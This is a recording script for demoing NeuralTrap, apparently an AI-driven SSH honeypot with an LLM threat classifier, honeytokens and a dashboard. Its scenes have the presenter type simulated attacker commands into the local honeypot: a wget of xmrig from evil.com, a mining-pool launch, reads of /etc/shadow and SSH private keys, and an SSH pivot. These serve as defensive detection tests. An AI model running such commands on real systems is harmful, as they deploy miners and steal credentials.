# 🎬 NeuralTrap — Recording Script

> Step-by-step guide for recording a full project demo. Follow this script in order to showcase every feature of the system.

---

## 🔧 PHASE 1 — Pre-Recording Setup (OFF CAMERA)

> Do this before you start recording so everything is clean.

1. **Clear the database** so the demo starts fresh:
   ```bash
   python3 clear_db.py
   ```
2. **Start MariaDB:**
   ```bash
   sudo systemctl start mariadb
   ```
3. **Start Ollama LLM:**
   ```bash
   sudo systemctl start ollama
   ```
4. **Start Cowrie Honeypot:**
   ```bash
   cd ~/cowrie && source cowrie-env/bin/activate
   cowrie start
   ```
5. **Generate Honeytokens** (seed fake files into honeypot):
   ```bash
   python3 generate_honeytokens.py
   ```
   - Wait for all 3 files to generate: `id_rsa`, `.aws/credentials`, `wp-config.php`
6. **Open two extra terminal tabs** — you'll need:
   - **Terminal 1** → NeuralTrap engine
   - **Terminal 2** → Attacker SSH session
   - **Terminal 3** → Dashboard (browser)
7. Confirm Ollama is responding:
   ```bash
   ollama run llama3.2 "hello" --verbose
   ```

---

## 🎬 PHASE 2 — Start Recording

### Scene 1: System Startup (~ 2 min)
> **What to show:** The full NeuralTrap boot sequence

1. **In Terminal 1**, start the engine:
   ```bash
   python3 neuraltrap.py
   ```
2. **Narrate / highlight:**
   - The ASCII banner loading
   - "AI Deception Network — Starting all systems..."
   - `✅ Tables ready`
   - `✅ Watching: ~/cowrie/var/log/cowrie`
   - `✅ LLM classifier ready`
   - `✅ Firewall module ready`
   - `🛡️ NeuralTrap is now protecting your network...`

3. **In a new terminal**, start the dashboard:
   ```bash
   streamlit run dashboard.py --server.port 8501
   ```

4. **Open the browser** to `http://localhost:8501`
5. **Show the Overview page** — all metrics should be at **0** (clean state)
6. **Click through each sidebar tab** quickly to show they all exist:
   - Overview → Live Attacks → Cowrie Intel → AI Predictions → Forensic Reports → Blocked IPs → Attacker Profiles → World Map → Live Threat Monitor → Malware Intelligence → Honeytoken Activity

---

### Scene 2: Reconnaissance Attack (~ 3 min)
> **What to show:** A low-threat attacker doing recon — the AI correctly scores it low

1. **In Terminal 2**, SSH into the honeypot:
   ```bash
   ssh root@localhost -p 2222
   ```
   - Password: `root` (or any password Cowrie accepts)

2. **Type these commands slowly** (pause 2-3 seconds between each):
   ```
   whoami
   uname -a
   cat /etc/hostname
   ip addr show
   ls -la /var/log/
   df -h
   w
   ```

3. **Switch to Terminal 1** and narrate:
   - Show `🔌 New connection` appearing
   - Show `🔑 login FAILED / ✅ login OK` events
   - Show `⌨️ [session] whoami` and the **⚡ Instant score** for each command
   - After 3 commands, show the **🧠 LLM classification** firing
   - Highlight: *"Score is LOW — the AI recognizes this is just reconnaissance"*

4. **Type `exit`** to end the session

5. **Switch to Terminal 1** — show:
   - `🔔 Session ended` message
   - Final classification: expect something like "Reconnaissance" with **score ~20-40%**
   - `📋 Report generated`

6. **Switch to the Dashboard:**
   - **Overview** → show metrics updated (1 session, commands captured)
   - **Live Attacks** → show the terminal-style feed with green commands
   - **AI Predictions** → show the session with LOW threat score and the 🔮 predicted next command
   - **Forensic Reports** → expand and read the AI-generated report
   - **Cowrie Intel** → show login attempts, session summary, dwell time

---

### Scene 3: Malware / Cryptominer Attack (~ 4 min)
> **What to show:** A dangerous attack that gets auto-blocked

1. **SSH in again** (new session):
   ```bash
   ssh root@localhost -p 2222
   ```

2. **Type these commands** (the dangerous sequence):
   ```
   uname -a
   cat /proc/cpuinfo | grep -c processor
   free -m
   wget http://evil.com/xmrig.tar.gz
   chmod +x xmrig
   ./xmrig -o pool.supportxmr.com:3333
   ```

3. **Switch to Terminal 1 immediately** and narrate:
   - Show the **instant scores spiking** when `wget`, `chmod`, `./xmrig` are typed
   - Show `🧠 Running LLM classification...` kicking in
   - Show `🎯 LLM Result: Cryptominer Deployment | Score: 95%`
   - Show **`🚨 HIGH THREAT DETECTED`** and **`🚨 BLOCKED: 127.0.0.1`**
   - Show `🔮 Predicted next: crontab persistence` or similar
   - Show `📋 Report generated`

4. **Switch to Dashboard:**
   - **Overview** → metrics updated: blocked IPs now = 1, high threat sessions = 1
   - **Live Attacks** → new commands in **RED** (dangerous highlighting)
   - **AI Predictions** → show the session with **HIGH** threat, red indicator, predicted next command
   - **Blocked IPs** → show the IP listed with attack type and threat score
   - **Forensic Reports** → expand and read the detailed AI report
   - **Live Threat Monitor** → show the threat score progression chart, block threshold line
   - **MITRE ATT&CK Tactic Frequency** chart

---

### Scene 4: Honeytoken Trigger (~ 3 min)
> **What to show:** Attacker accesses a fake file → instant detection and block

1. **SSH in again**:
   ```bash
   ssh root@localhost -p 2222
   ```

2. **Type these commands:**
   ```
   ls
   cd /root
   cat .ssh/id_rsa
   ```

3. **Switch to Terminal 1** immediately:
   - Show `🍯 HONEYTOKEN TRIGGERED: SSH Private Key via 'cat .ssh/id_rsa'`
   - Show threat score instantly set to **100%**
   - Show `🚨 BLOCKED` and `📋 Report generated`

4. **Switch to Dashboard:**
   - **🍯 Honeytoken Activity** tab → show the trigger logged with session ID, IP, token type, command used
   - **Blocked IPs** → show the new block entry
   - **Forensic Reports** → show the report mentioning honeytoken interaction

---

### Scene 5: Lateral Movement / Credential Theft (~ 3 min)
> **What to show:** A sophisticated attacker stealing credentials and pivoting

1. **SSH in again:**
   ```bash
   ssh root@localhost -p 2222
   ```

2. **Type these commands:**
   ```
   whoami
   id
   cat /etc/passwd
   cat /etc/shadow
   find / -name id_rsa 2>/dev/null
   cat /root/.ssh/known_hosts
   arp -a
   ssh -o StrictHostKeyChecking=no root@192.168.1.10
   ```

3. **Switch to Terminal 1:**
   - Show the progressive scoring — escalating with each command
   - Show the LLM recognizing **Lateral Movement / Credential Theft**
   - Show MITRE tactics like `TA0006 Credential Access`
   - Note: `find / -name id_rsa` will also trigger the **honeytoken** → instant 100%

4. **Switch to Dashboard:**
   - **Attacker Profiles** → show the IP now has multiple sessions, attack types aggregated
   - **Live Threat Monitor** → show the timeline chart with multiple sessions at varying threat levels

---

### Scene 6: test_attack.py Standalone Tester (~ 3 min)
> **What to show:** The offline AI testing tool

1. **In a new terminal**, run:
   ```bash
   python3 test_attack.py
   ```
2. Show the **menu** with 5 scenarios + custom mode
3. **Run Scenario 1** (Cryptominer):
   - Show the command-by-command scoring with the visual bars
   - Show the progressive LLM classification every 3 commands
   - Show the **final session analysis** with full breakdown
   - Show the **score progression** chart at the bottom

4. **Run Scenario 5** (Slow Recon):
   - Show that the AI scores it **much lower** — demonstrating it distinguishes between attack types

5. Optionally, show **interactive mode** (option 6) — type a few custom commands

---

### Scene 7: Dashboard Deep Dive (~ 3 min)
> **What to show:** All remaining dashboard pages with real data

1. **🌍 Attack World Map** → Note: only shows for external IPs. If testing locally, say *"In production with real attacks, this would map global origins"*
2. **📈 Live Threat Monitor** → Show:
   - Threat score distribution histogram
   - Sessions timeline with block threshold line
   - Threat statistics (high/medium/low counters)
   - MITRE ATT&CK tactic frequency bar chart
3. **🔬 Cowrie Intel** → Show:
   - Login events table (failed + successful)
   - File transfers (downloads captured)
   - Session summaries with dwell times, client versions, HASSH fingerprints
   - Labeled sessions with Cowrie sidecar data
4. **🦠 Malware Intelligence** → Note: show if a download happened; otherwise explain *"When a real attacker downloads a payload, the AI reverse-engineers it here"*
5. **👤 Attacker Profiles** → Show IP profiles with multi-session data

---

### Scene 8: Analyst Feedback Loop (~ 1 min)
> **What to show:** Human-in-the-loop feedback on forensic reports

1. Go to **📋 Forensic Reports**
2. Expand a report
3. Click **✅ Accurate** or **❌ Inaccurate** button
4. Show the feedback being saved

---

### Scene 9: Closing Shot (~ 1 min)

1. Switch back to **🏠 Overview** page
2. Show all the metrics now populated from the demo
3. Switch to Terminal 1 — show the engine still running, still monitoring
4. **Say:** *"NeuralTrap — AI-powered active defense that detects, classifies, and blocks threats in real-time"*

---

## 🎬 POST-RECORDING

- Stop the recording
- Run `cowrie stop` to shut down the honeypot
- Stop the dashboard (Ctrl+C)
- Stop NeuralTrap engine (Ctrl+C)

---

## ⏱️ Estimated Recording Time

| Scene | Duration |
|-------|----------|
| System Startup | ~2 min |
| Recon Attack | ~3 min |
| Malware Attack | ~4 min |
| Honeytoken Trigger | ~3 min |
| Lateral Movement | ~3 min |
| test_attack.py | ~3 min |
| Dashboard Deep Dive | ~3 min |
| Analyst Feedback | ~1 min |
| Closing | ~1 min |
| **TOTAL** | **~23 min** |

---

## 💡 Tips for a Clean Recording

- **Maximize Terminal 1** when showing NeuralTrap engine output
- **Zoom in the browser** (Ctrl+Plus) to 125% so dashboard text is readable
- **Pause 2-3 seconds** between typing each command so the AI output is visible
- **Don't rush** — let the LLM finish generating before switching tabs
- If the LLM takes too long, fill the silence: *"The LLM is analyzing the full command chain..."*
- Keep **Auto Refresh** OFF on the dashboard (manually refresh with F5 for cleaner cuts)
- Turn on **Auto Refresh** only when showing the Live Threat Monitor or AI Predictions tabs
